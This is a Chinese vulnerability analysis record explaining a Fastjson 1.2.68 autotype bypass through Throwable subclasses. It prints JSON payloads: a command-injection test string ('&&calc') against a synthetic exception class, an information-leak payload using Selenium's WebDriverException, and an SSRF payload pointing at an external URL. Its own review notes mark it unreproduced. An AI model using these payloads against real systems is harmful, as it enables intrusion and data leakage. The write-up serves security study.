---
source: "hatch 补库批 20260928"
product: "Fastjson1.2.68 with Selenium"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Fastjson 1.2.68 最新版本有限制 autotype bypass"
prerequisites: "来源所述条件，未列明部分仍待核：1.2.68; selenium-api classpath; synthetic PingException/DatasourceException examples; no JDK/Selenium versions"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-80ae80bb6babc857e1d9ccd6"
entity_id: "ve-80ae80bb6babc857e1d9ccd6"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：1.2.68; selenium-api classpath; synthetic PingException/DatasourceException examples; no JDK/Selenium versions

代码与实验材料：Constructor selection and setters/getters explained; Selenium response and code screenshots replaced barefilenames; malformed-looking$x.systemInformation reference needs exact parser validation

来源证据范围：b1ue348 original and CSDN link

- **适用与权限边界（1）**：Only this branch requiresThrowable; title/intro should not imply every1.2.68 bypass does; custom exception not existing RCE gadget。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **证据待核（2）**：URLDataSource construction alone doesn't establish network request; sink/evidence absent; latest wording historical。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Fastjson 1.2.68 最新版本有限制 autotype bypass

一、漏洞简介
------------

该漏洞和以往的 autotype bypass 不同，要求 gadget 必须继承自 Throwable
异常类，所以常见的 JNDI gadget 就无法在此处使用。

所以只能找在异常类中的构造方法、set方法、get方法、toString等方法内的敏感操作才会触发漏洞。

由于异常类中很少使用高危函数，所以我目前还没有找到可以 RCE 的
gadget，只找到了几个非 RCE 的 gadget。

二、漏洞影响
------------

Fastjson 1.2.68

三、复现过程
------------

反序列化时如果遇到 \@type 指定的类为 Throwable
的子类那对应的反序列化处理类就是 ThrowableDeserializer

> **图片待核**：原归档在此处仅保留文件名 `1.jpg`，没有可对应的图片引用。

漏洞点在 `ThrowableDeserializer#deserialze`

> **图片待核**：原归档在此处仅保留文件名 `2.jpg`，没有可对应的图片引用。

当第二个字段的 key 也是 \@type 的时候就会取 value 当做类名做一次
checkAutoType 检测。

调用 `ParserConfig#checkAutoType` 时注意第二个参数，它指定了第二个参数
expectClass 为 Throwable.class 类对象，通常情况下这个参数都是 null。

checkAutoType 一般有以下几种情况会通过校验。

1.  白名单里的类

2.  开启了 autotype

3.  使用了 JSONType 注解

4.  指定了期望类（expectClass）

5.  缓存 mapping 中的类

1.2.68 又更新了一个使用了 ParserConfig.AutoTypeCheckHandler
接口通过校验的类。

这个漏洞实际上就是基于第四种，指定了期望类的情况。

> **图片待核**：原归档在此处仅保留文件名 `3.jpg`，没有可对应的图片引用。

这里判断了如果期望类不为空且反序列化目标类继承自期望类就会添加到缓存
mapping 并且返回这个 class。

> **图片待核**：原归档在此处仅保留文件名 `4.jpg`，没有可对应的图片引用。

autotype 检测通过后就会开始实例化异常类对象。

同时把 message 和 cause 传给了 ThrowableDeserializer\#createException
处理。

> **图片待核**：原归档在此处仅保留文件名 `5.jpg`，没有可对应的图片引用。

依次按照以下顺序进行实例化构造方法参数1类型为String.class且参数2类型为Throwable.class，如果找不到就按照参数1类型为String.class，还找不到就取无参构造方法。

> **图片待核**：原归档在此处仅保留文件名 `6.jpg`，没有可对应的图片引用。

最后为被实例化后的异常类装配属性。

遍历 otherValues ，按照 key 去调用异常类的 set 方法，otherValue 是当前
jsonobject 对象中除了 \@type、message、cause、stackTrace
以外的其他字段。

例如 \@type 的类是 java.lang.Exception，otherValues 的第一条是
\"msg\"=\>\"hello\"。

那么这里就会先去实例化 Exception 对象，再去调用
exception.setMsg(\"hello\")

这里就是 set 触发的地方，而get方法则会在 JSON 转 JSONObject
的时候会调用该异常类的所有 get 方法。

也可以通过 \$ref 字段借助 JSONPath 去访问 get 方法，关于 JSONPath
，我在博客中的另一篇"fastjson 1.2.62 拒绝服务漏洞"文章中有提到过。

问题分析完了，下面就是如何去寻找合适的 gadget 触发漏洞了。

我自己先写一个存在问题的异常类，去验证一下问题。

    public class PingException extends Exception {

        private String domain;

        public PingException() {
            super();
        }

        public String getDomain() {
            return domain;
        }

        public void setDomain(String domain) {
            this.domain = domain;
        }

        @Override
        public String getMessage() {
            try {
                Runtime.getRuntime().exec("cmd /c ping "+domain);
            } catch (IOException e) {
                return e.getMessage();
            }

            return super.getMessage();
        }
    }
     复制

构造的 JSON 如下

    {"@type":"java.lang.Throwable", "@type":"PingException","domain":"b1ue.cn&&calc"}

> **图片待核**：原归档在此处仅保留文件名 `7.jpg`，没有可对应的图片引用。

当然这只是用来测试的，真实情况很少有人把执行命令的方法写进异常类。

不过我找到了 selenium 的一个敏感信息泄露，selenium
一般用来操控浏览器进行爬虫，在很多基于浏览器操作的爬虫项目里都会使用到
selenium，如果同时也使用了 fastjson ，就会存在敏感信息泄露的问题。

`org.openqa.selenium.WebDriverException` 会输出这些信息主机IP、主机名、系统名、系统架构、操作系统版本、java版本、Selenium版本、webdriver驱动版本等等一系列信息。

同时由于是异常类，父类的 getStackTrace()
也会被调用，会输出当前方法栈信息，可从中看出使用了什么框架。

> **图片待核**：原归档在此处仅保留文件名 `8.jpg`，没有可对应的图片引用。

这是反序列化`org.openqa.selenium.WebDriverException`类输出的信息。

### 漏洞复现

#### poc

    {"content":{"$ref":"$x.systemInformation"}, "x": {"@type":"java.lang.Exception","@type":"org.openqa.selenium.WebDriverException"}}

QQ截图20200528144437.png

还可以看到一些方法栈信息，看到一些服务端使用的框架的信息。

当然这个前提是需要WEB应用的classpath存在selenium-api。

作者提出还有一个思路可以SSRF(当然也需要相应的classpath)：

从mvn引入，或者自己写一个类：

    package org.joychou;

    import javax.activation.DataSource;
    import javax.activation.URLDataSource;
    import java.net.URL;

    public class DatasourceException extends Exception {

        public DatasourceException() {

        }

        private DataSource dataSource;

        public DataSource getDataSource() {
            return dataSource;
        }

        public void setDataSource(URL url) {
            this.dataSource = new URLDataSource(url);
        }
    }

> **图片待核**：原归档在此处仅保留文件名 `2.png`，没有可对应的图片引用。

#### poc

    {"@type":"java.lang.Exception","@type":"org.joychou.DatasourceException", "dataSource": {"@type": "java.net.URL", "val": "http://www.0-sec.org:8888/fastjson"}}

> **图片待核**：原归档在此处仅保留文件名 `3.png`，没有可对应的图片引用。

参考了链接
----------

> https://b1ue.cn/archives/348.html
>
> https://blog.csdn.net/caiqiiqi/article/details/106050079
